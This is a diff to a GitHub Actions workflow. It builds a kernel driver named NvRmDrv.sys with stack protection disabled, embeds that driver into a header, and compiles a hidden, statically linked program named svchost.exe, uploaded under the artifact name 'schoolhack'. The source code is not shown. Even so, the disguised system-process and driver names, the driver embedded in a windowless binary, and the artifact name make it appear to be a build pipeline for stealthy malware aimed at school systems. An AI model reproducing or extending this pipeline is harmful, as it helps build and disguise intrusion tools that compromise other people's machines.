@@ -1,4 +1,17 @@
-- name: Install WDK
+name: build
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-2022
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install WDK
         shell: pwsh
         run: |
           Write-Host "Installing WDK via winget..."
@@ -8,13 +21,8 @@
           Write-Host "Installing WDK VSIX..."
           $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
           $vsixInstaller = & $vswhere -nologo -latest -products * -property enginePath | Join-Path -ChildPath 'VSIXInstaller.exe'
-          $vsixPath = "${env:ProgramFiles(x86)}\Windows Kits\10\Vsix\VS2022\10.0.26100.0\$env:PROCESSOR_ARCHITECTURE\WDK.vsix"
-
-          if (-not (Test-Path $vsixPath)) {
-              $vsixPath = Get-ChildItem "${env:ProgramFiles(x86)}\Windows Kits\10\Vsix" -Recurse -Filter "WDK.vsix" | Select-Object -First 1 -ExpandProperty FullName
-          }
+          $vsixPath = Get-ChildItem "${env:ProgramFiles(x86)}\Windows Kits\10\Vsix" -Recurse -Filter "WDK.vsix" | Select-Object -First 1 -ExpandProperty FullName
           if (-not $vsixPath) { throw "WDK.vsix not found after WDK install" }
-
           Start-Process -FilePath $vsixInstaller -ArgumentList "/quiet", "/admin", "`"$vsixPath`"" -Wait -NoNewWindow
 
           $km = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\Include" -Directory |
@@ -22,3 +30,44 @@
                 Sort-Object Name -Descending | Select-Object -First 1
           if (-not $km) { throw "WDK install failed: no km\ntddk.h" }
           Write-Host "WDK headers at: $($km.FullName)"
+
+      - name: Build driver
+        shell: cmd
+        run: |
+          call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
+          cl /nologo /kernel /GS- /O2 /W3 /c drv\NvRmDrv.c ^
+             /Fo:drv\NvRmDrv.obj ^
+             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\km" ^
+             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\shared" ^
+             /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.26100.0\ucrt"
+          if errorlevel 1 exit /b 1
+          link /nologo /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry ^
+             /OUT:drv\NvRmDrv.sys drv\NvRmDrv.obj ^
+             /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.26100.0\km\x64" ^
+             ntoskrnl.lib hal.lib ntstrsafe.lib
+          if errorlevel 1 exit /b 1
+          dir drv\NvRmDrv.sys
+
+      - name: Build bin2h
+        shell: cmd
+        run: |
+          g++ -O2 bin2h.cpp -o bin2h.exe
+          if errorlevel 1 exit /b 1
+          bin2h.exe drv\NvRmDrv.sys driver_blob.h
+          if errorlevel 1 exit /b 1
+          dir driver_blob.h
+
+      - name: Build svchost.exe
+        shell: cmd
+        run: |
+          g++ -O2 -municode -mwindows -static -static-libgcc -static-libstdc++ ^
+              main.cpp -o svchost.exe ^
+              -lnetapi32 -lws2_32 -ladvapi32 -luser32 -lgdi32 -lole32 -lshell32
+          if errorlevel 1 exit /b 1
+          dir svchost.exe
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: schoolhack
+          path: svchost.exe
